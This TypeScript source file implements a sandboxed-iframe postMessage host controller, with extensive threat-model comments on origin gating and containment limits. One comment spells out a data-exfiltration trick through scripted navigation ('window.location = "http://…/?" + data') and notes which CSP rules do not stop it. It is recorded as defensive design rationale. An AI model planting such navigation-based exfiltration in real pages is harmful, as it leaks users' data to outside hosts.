/**
 * quick-studio UI (Ring 2) — the sandbox host controller (Story 5.5).
 *
 * The Ring 2 side of the one-way `postMessage` channel to the Ring 3 guest. It pushes
 * the render doc — the user's own query output as canonical {@link FrozenData} — INTO
 * the guest and routes the guest's outbound SIGNALS ({@link SandboxOutbound}) to
 * `onSignal`. It never returns data in response to a guest message — there is no
 * data-reply path here at all.
 *
 * The cross-origin `targetOrigin` nuance (get this wrong and containment leaks): the
 * guest runs under `sandbox="allow-scripts"` WITHOUT `allow-same-origin`, so its origin
 * is OPAQUE ("null"). Therefore (1) `pushDoc` posts with `targetOrigin: "*"` — you
 * cannot target an opaque origin by origin string, so `"*"` is mandatory rather than
 * lax, and what actually bounds delivery is that it goes to ONE window handle: this
 * iframe's `contentWindow` and nothing else; and (2) inbound is validated by window
 * IDENTITY (`event.source === iframeWindow`) plus the opaque `"null"` origin — never by
 * an origin string.
 *
 * The residual, recorded rather than papered over (DW-47): what lands in the guest is the
 * real output of the query the user just ran — the same rows they are looking at in the
 * results pane — and calling it harmless because it is "already visible" understates it,
 * which is what an earlier version of this comment did. The guest's `connect-src 'none'`
 * blocks scripted REQUESTS but not scripted same-frame NAVIGATION, so a hostile guest
 * could still carry that payload off-machine as `window.location = "http://…/?" + data`.
 * That is ACCEPTED: the recipient is the operator's own already-visible output, the
 * guest receives no token, no connection handle and no way to ask for more, and the
 * alternatives (a `pushDoc` handshake gated on a guest `ready` signal, or leaning on the
 * embedder's `frame-src` as a navigation control) cost more than the exposure is worth.
 * The canonical record of that trade — including what the shell's `frame-src` DOES
 * already mitigate — lives on `GUEST_CSP` in `core/sandbox-server.ts`; keep this a
 * pointer rather than a second copy that can drift. REVISIT if untrusted or shared
 * reports are ever introduced — the moment a guest can render data the viewer does not
 * already hold, "exfiltrating it to yourself" stops describing the threat.
 *
 * One case where the window handle and the intended DOCUMENT come apart, recorded because
 * this controller is where the data actually leaves Ring 2: with the Core exposed
 * (`QS_HOST` non-loopback) the injected sandbox origin is loopback, so a REMOTE viewer's
 * iframe resolves it against THEIR machine. If something unrelated is listening on that
 * ephemeral port, the frame loads a foreign document — one serving its own headers, so
 * none of `GUEST_CSP` applies to it — and `pushDoc` posts the render frame into it. The
 * recipient is a process on the viewer's own box rather than a remote attacker, which is
 * why this is a residual and not a stop-ship, but it is emphatically not "delivery is
 * confined to our guest". It is also a further reason the sandbox refuses to bind
 * off-loopback (DW-48): the exposed configuration is already the degraded one.
 *
 * Pure + injectable (no `document`): the React `SandboxFrame` seam owns the real
 * `window` listener and hands events to `handleMessage`. No `ai`/`@ai-sdk` import.
 */

import {
  SANDBOX_PROTOCOL_VERSION,
  isSandboxOutbound,
  type SandboxInbound,
  type SandboxOutbound,
  type SandboxRenderDoc,
} from "../../shared/contract.ts";
import { isUsableSandboxOrigin } from "../../shared/sandbox-origin.ts";

/** The opaque origin a `sandbox="allow-scripts"` (no `allow-same-origin`) guest posts from. */
const OPAQUE_ORIGIN = "null";

/** The minimal `postMessage` target the host pushes into (an iframe `contentWindow`). */
export type PostMessageTarget = {
  postMessage: (message: unknown, targetOrigin: string) => void;
};

/** The minimal inbound `MessageEvent` the host reads: sender identity + origin + payload. */
export type HostMessageEvent = {
  readonly source: unknown;
  readonly origin: string;
  readonly data: unknown;
};

export type SandboxHostDeps = {
  /** The guest iframe's `contentWindow`: the push target AND the identity gate. */
  readonly iframeWindow: PostMessageTarget;
  /** Sink for validated guest signals (`ready`/`height`/`datum-clicked`/`error`). */
  readonly onSignal: (signal: SandboxOutbound) => void;
};

export type SandboxHost = {
  /**
   * Push a `render` frame carrying the render doc (escaped Markdown + optional validated
   * chart + canonical frozen data) INTO the guest window (Story 5.6).
   */
  pushDoc: (doc: SandboxRenderDoc) => void;
  /** Route one inbound message to `onSignal` iff it is a real guest signal (else drop). */
  handleMessage: (event: HostMessageEvent) => void;
  /** Detach: after this, `pushDoc`/`handleMessage` are inert (unmount safety). */
  dispose: () => void;
};

/** The iframe attributes for the untrusted guest: `allow-scripts` and NOTHING else. */
export type SandboxIframeAttrs = {
  readonly src: string;
  readonly sandbox: "allow-scripts";
};

/**
 * Build the sandbox iframe attributes. The `sandbox` token list is EXACTLY
 * `allow-scripts` — never `allow-same-origin` (which would collapse the origin
 * boundary), nor `allow-forms`/`allow-popups`/`allow-top-navigation`/`allow-modals`.
 * `src` is the injected Ring 3 origin — but when that origin is empty or not a usable
 * `http(s)://host` URL, `src` falls back to `about:blank`. It is NEVER `""`: an empty
 * `src` resolves to the PARENT Core document, which would load the token-bearing page
 * into the `allow-scripts` frame — the opposite of containment.
 *
 * The usability test is {@link isUsableSandboxOrigin}, the SAME function `shellCspHeaders`
 * gates the app shell's `frame-src` on — applied here to the RAW injected value, which is
 * the same input Ring 1 gates. That is not a stylistic preference: the header and this
 * attribute must reach the same verdict for the same value, or the CSP admits an origin
 * the frame never visits (harmless) or refuses the one it does (a blank preview pane with
 * no in-app explanation). This half of the pair is why Ring 1 no longer runs a character
 * filter first: while it did, the two rings ran ONE gate over two different inputs, and
 * a value like `"http://127.0.0.1:67'89"` was admitted by the header (as a repaired
 * origin) while this function sent the frame to `about:blank`. One function, one rule,
 * one input, both rings. Pure.
 */
export function buildSandboxIframeAttrs(sandboxOrigin: string): SandboxIframeAttrs {
  const usable = isUsableSandboxOrigin(sandboxOrigin);
  return { src: usable ? sandboxOrigin : "about:blank", sandbox: "allow-scripts" };
}

/**
 * Create the host controller. `pushDoc` posts a `render` frame to the iframe window
 * with `targetOrigin: "*"` (mandatory against an opaque-origin guest). `handleMessage`
 * accepts a message ONLY when it comes from the exact iframe window (`event.source ===
 * iframeWindow`), from the opaque `"null"` origin, AND passes `isSandboxOutbound`;
 * anything else is silently dropped. There is deliberately no branch that replies with
 * data. `dispose` flips the controller inert so a late message after unmount is a no-op.
 */
export function createSandboxHost(deps: SandboxHostDeps): SandboxHost {
  const { iframeWindow, onSignal } = deps;
  let disposed = false;

  function pushDoc(doc: SandboxRenderDoc): void {
    if (disposed) return;
    const frame: SandboxInbound = {
      type: "render",
      protocolVersion: SANDBOX_PROTOCOL_VERSION,
      markdown: doc.markdown,
      chart: doc.chart,
      data: doc.data,
    };
    // `"*"` is required, not permissive: an opaque-origin guest cannot be addressed by
    // origin string at all, so this is the only expressible target. The bound on delivery
    // is the WINDOW HANDLE — `iframeWindow` is this one guest frame, so no OTHER window
    // (sibling frame, opener, embedder) receives it. Note what that does and does not
    // promise: it pins the window, not the DOCUMENT currently loaded in it, and the
    // `"*"` target means we never check who answered. See the module docstring for the
    // exposed-mode case where those come apart. The payload is the user's own query
    // output (canonical DW-47 record: `GUEST_CSP` in `core/sandbox-server.ts`); it is not
    // a secret, but it is not "public" either.
    iframeWindow.postMessage(frame, "*");
  }

  function handleMessage(event: HostMessageEvent): void {
    if (disposed) return;
    // Identity gate (the sacred check): only the exact iframe window is trusted. The
    // `iframeWindow` non-nullish guard is load-bearing — without it a spoofed
    // `source: null` would pass `source === iframeWindow` when the iframe window is
    // itself nullish (e.g. before the frame's contentWindow exists).
    if (iframeWindow == null || event.source !== iframeWindow) return;
    // Opaque-origin gate: a no-`allow-same-origin` guest always posts from "null".
    if (event.origin !== OPAQUE_ORIGIN) return;
    // Shape gate: only a real outbound SIGNAL is routed — the union cannot carry data.
    if (!isSandboxOutbound(event.data)) return;
    onSignal(event.data);
  }

  function dispose(): void {
    disposed = true;
  }

  return { pushDoc, handleMessage, dispose };
}
